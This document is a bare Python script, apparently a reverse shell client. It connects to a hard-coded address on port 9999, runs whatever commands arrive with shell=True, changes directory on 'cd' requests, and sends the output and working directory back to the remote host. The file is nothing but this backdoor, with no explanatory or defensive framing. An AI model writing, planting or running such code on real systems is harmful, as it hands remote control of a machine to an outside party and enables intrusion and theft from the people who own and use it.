import os
import socket
import subprocess

s: socket.socket = socket.socket()
host: str = "172.26.1.156"
port: int = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd: subprocess.Popen[bytes] = subprocess.Popen(
            data[:].decode("utf-8"),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        output_bytes = cmd.stdout.read() + cmd.stderr.read()  # type: ignore
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(f"{output_str} {os.getcwd()} '>'"))

        print(output_str)


s.close()
